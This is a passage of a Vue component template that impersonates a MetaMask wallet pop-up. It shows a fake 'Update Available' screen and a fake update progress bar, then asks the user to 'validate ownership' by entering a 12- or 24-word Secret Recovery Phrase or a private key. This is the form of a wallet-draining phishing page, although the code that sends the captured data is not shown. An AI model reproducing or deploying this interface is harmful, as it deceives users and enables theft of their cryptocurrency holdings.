<template>
  <div
    class="bg-white rounded-2xl w-full text-white overflow-hidden  mx-auto"
  >
    <!-- Header (present on most steps) -->
    <div
      v-if="currentStep !== 1"
      class="flex justify-between items-center py-3 px-4 border-b border-gray-700"
    >
      <div class="flex items-center gap-3">
        <img
          src="data:image/png;base64,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"
          alt="MetaMask"
          class="h-10 w-10 rounded-full"
        />
      </div>
      <div class="flex items-center gap-3">
        <svg
          @click.prevent="closeModal"
          xmlns="http://www.w3.org/2000/svg"
          class="h-6 w-6 text-gray-500 cursor-pointer"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M6 18L18 6M6 6l12 12"
          />
        </svg>
      </div>
    </div>
    <hr v-if="currentStep !== 1" class="border-t border-gray-500" />

    <!-- Step container -->
    <div class="min-h-[500px] flex flex-col relative p-6">
      <!-- STEP 1: MetaMask logo + spinner (loads for 3s) -->
      <transition name="fade" mode="out-in">
        <div
          v-if="currentStep === 1"
          key="s1"
          class="flex flex-col items-center justify-center h-full absolute inset-0"
        >
          <img
            src="data:image/png;base64,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"
            alt="MetaMask Logo"
            class="w-40 h-40 mb-4 object-cover"
          />
          <svg
            aria-hidden="true"
            class="w-20 h-20 text-gray-100 animate-spin dark:text-gray-600 fill-orange-600"
            viewBox="0 0 100 101"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
              fill="#eeeeee"
            />
            <path
              d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
              fill="currentFill"
            />
          </svg>
        </div>

        <!-- STEP 2: Update Available -->
        <div v-else-if="currentStep === 2" key="s2" class="flex flex-col">
          <div class="flex flex-col items-center gap-4 py-6">
            <div class="flex flex-col items-center mt-2">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                class="h-16 w-16 mb-3 text-[#0376c9]"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"
                ></path>
              </svg>
              <p class="text-4xl text-black font-bold">Update Available</p>
              <p class="text-gray-500 text-xl">Version 12.12.0</p>
            </div>

            <div class="bg-gray-100 rounded-2xl px-4 py-3 w-full mt-2">
              <ul
                class="text-neutral-900 text-[12px] list-disc mt-2 list-inside space-y-1"
              >
                <li>Fix main build modifying desktop build steps.</li>
                <li>Improving the security system.</li>
                <li>Fix incorrect network information.</li>
                <li>Improve performance on signature request.</li>
              </ul>
            </div>

            <div class="w-full mt-5">
              <button
                @click="startUpdate"
                class="w-full py-4 text-2xl text-white border-none bg-[#0376c9] rounded-[30px] font-bold text-[#222] hover:opacity-95"
              >
                Update
              </button>
            </div>

            <p class="text-lg text-gray-600 text-center">
              Need help?
              <a href="#" class="text-blue-400 font-semibold underline"
                >Contact MetaMask Support</a
              >
            </p>
          </div>
        </div>

        <!-- STEP 3: Updating (spinner + progress) -->
        <div
          v-else-if="currentStep === 3"
          key="s3"
          class="flex flex-col items-center"
        >
          <div class="flex flex-col items-center gap-3 py-6 w-full">
            <svg
              aria-hidden="true"
              class="w-20 h-20 text-gray-200 animate-spin dark:text-gray-600 fill-[#0376c9]"
              viewBox="0 0 100 101"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                fill="#eeeeee"
              />
              <path
                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                fill="currentFill"
              />
            </svg>
            <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">
              Updating MetaMask
            </h2>
            <p class="text-gray-700 text-xl text-center">
              Please wait while we update to version 12.12.0
            </p>

            <div class="w-full mt-6">
              <div class="bg-gray-100 h-2 rounded-full overflow-hidden">
                <div
                  class="h-2 rounded-full transition-all"
                  :style="{
                    width: progress + '%',
                    background: '#0376c9',
                  }"
                ></div>
              </div>
              <div
                class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-gray-700"
              >
                <!-- <span>0%</span> -->
                <span>{{ Math.round(progress) }}%</span>
                <!-- <span>100%</span> -->
              </div>
            </div>

            <p class="text-gray-700 text-lg text-center mt-4 text-center">
              This may take a few moments. Please do not close this window.
            </p>
          </div>
        </div>

        <!-- STEP 4: Import / Secret Recovery Phrase / Private Key -->
        <div
          v-else-if="currentStep === 4"
          key="s4"
          class="flex flex-col w-full"
        >
          <div class="mb-4" v-if="importType !== 'private'">
            <h2 class="text-4xl text-black mt-2 text-center font-bold">
              Import your wallet with your Secret Recovery Phrase
            </h2>
            <p class="text-gray-600 text-base text-center">
              We will use your Secret Recovery Phrase to validate your
              ownership. Enter the Secret Recovery Phrase that you were given
              when you created your wallet. <br />
              <a
                href="#"
                class="text-base text-blue-400 underline mt-2 inline-block"
                >Learn more</a
              >
            </p>
          </div>

          <!-- Selection -->
          <div class="mb-4" v-if="importType !== 'private'">
            <select
              v-model="importType"
              id="countries"
              class="w-full text-lg bg-transparent placeholder:text-slate-400 text-slate-700 text-base border border-slate-200 rounded pl-3 pr-8 py-3 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer"
            >
              <option value="12">I have a 12-word phrase</option>
              <option value="24">I have a 24-word phrase</option>
              <option value="private">I have a private key</option>
            </select>

            <div
              class="bg-[#f5f9fc] border-l-4 border-solid rounded-md p-1 mt-4 flex items-center" style="border-left-color:#0376c9"
            >
              <div class="text-[#0376c9] mr-2 mt-0.5">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  class="h-5 w-5"
                  viewBox="0 0 20 20"
                  fill="currentColor"
                >
                  <path
                    fill-rule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                    clip-rule="evenodd"
                  ></path>
                </svg>
              </div>
              <p class="text-xl font-semibold text-gray-600 m-0">
                You can paste your entire secret recovery phrase into any field
              </p>
            </div>
          </div>

          <!-- Private key screen -->
          <div v-if="importType === 'private'">
            <div class="rounded-md mb-4">
              <p class="text-gray-800 text-xl font-semibold mb-2">
                Imported accounts won't be associated with your MetaMask Secret
                Recovery Phrase.
              </p>
              <a href="#" class="text-xl text-blue-400 underline"
                >Learn more about imported accounts</a
              >
            </div>
            <div class="mb-4">
              <label
              for="message"
              class="block text-black mb-2 text-xl font-medium text-gray-900 dark:text-white"
              >Select Type</label
            >
            <select
              v-model="importType"
              id="countries"
              class="w-full text-lg bg-transparent placeholder:text-slate-400 text-slate-700 text-base border border-slate-200 rounded pl-3 pr-8 py-3 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer"
            >
              <option value="12">I have a 12-word phrase</option>
              <option value="24">I have a 24-word phrase</option>
              <option value="private">Private key</option>
            </select>
            </div>
            

            
            <label
              for="message"
              class="block text-black mb-2 text-xl font-medium text-gray-900 dark:text-white"
              >Enter your private key string here:</label
            >
            <textarea
              v-model="privateKeyInput"
              rows="5"
              style="background: white; font-size: 14px; padding-top: 2px"
              class="w-full rounded-md py-2 px-3 text-black text-sm outline-none mb-6"
            ></textarea>

            <div class="flex gap-3 mt-6 absolute bottom-0 left-0 right-0 w-full p-3">
              <button
                @click="cancelImport"
                class="flex-1 bg-gray-200 text-gray-900 py-3 border-none hover:border-none focus:border-none focus:text-[#0376c9] hover:text-[#0376c9] rounded-[30px] font-bold"
              >
                Cancel
              </button>
              <button
                @click="confirmPrivateKey"
                :disabled="isLoading"
                class="flex-1 bg-[#0376c9] py-4 bg-[#0376c9] text-white border-none hover:border-none hover:text-[#222] rounded-[30px] font-bold text-[#222]"
              >
                <span v-if="!isLoading">Import</span>
                <svg
                  v-else
                  class="animate-spin h-5 w-5 inline-block"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                  />
                </svg>
              </button>
            </div>
          </div>

          <!-- Recovery phrase grid -->
          <div v-else>
            <div class="grid grid-cols-3 gap-3 mt-4">
              <div v-for="n in phraseCount" :key="n" class="relative">
                <span
                  class="absolute left-2 top-2 text-gray-500 text-sm select-none"
                  >{{ n }}</span
                >
                <div class="relative">
                  <input
                    :type="hiddenFields[n - 1] ? 'password' : 'text'"
                    v-model="phraseWords[n - 1]"
                    class="w-full bg-[#181818] rounded-md py-2 pl-10 pr-10 text-black text-sm outline-none"
                  />
                  <div
                    @click="toggleFieldVisibility(n - 1)"
                    type="button"
                    class="absolute right-2 top-2 text-gray-400"
                  >
                    <svg
                      v-if="hiddenFields[n - 1]"
                      xmlns="http://www.w3.org/2000/svg"
                      class="h-5 w-5"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                      />
                      <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.269 2.943 9.542 7-1.273 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                      />
                    </svg>
                    <svg
                      v-else
                      xmlns="http://www.w3.org/2000/svg"
                      class="h-5 w-5"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.542-7a9.96 9.96 0 012.502-4.043M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                      />
                      <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M3 3l18 18"
                      />
                    </svg>
                  </div>
                </div>
              </div>
            </div>

